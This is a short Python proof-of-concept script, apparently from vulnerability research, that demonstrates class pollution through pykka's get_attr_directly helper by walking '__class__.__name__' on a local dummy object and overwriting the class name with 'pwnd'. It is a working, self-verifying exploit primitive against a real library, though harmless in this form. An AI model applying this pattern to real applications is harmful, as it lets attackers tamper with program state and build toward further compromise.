# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: _handle_receive (ProxySetAttr)
# Type: get-attr-set-attr

from pykka._introspection import get_attr_directly

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = ("__class__", "__name__")

def run_poc():
  parent_attr = get_attr_directly(target, PAYLOAD[:-1])
  setattr(parent_attr, PAYLOAD[-1], payload_value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
